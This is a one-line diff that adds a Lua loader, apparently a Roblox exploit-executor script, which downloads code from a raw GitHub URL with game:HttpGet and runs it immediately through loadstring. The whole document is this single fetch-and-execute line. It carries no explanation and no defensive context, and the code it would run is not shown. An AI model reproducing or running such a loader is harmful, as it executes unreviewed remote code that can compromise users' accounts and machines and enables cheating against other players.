@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/new-stages-dont-splash-spam7-i158dqgxo36j2j.lua"))()
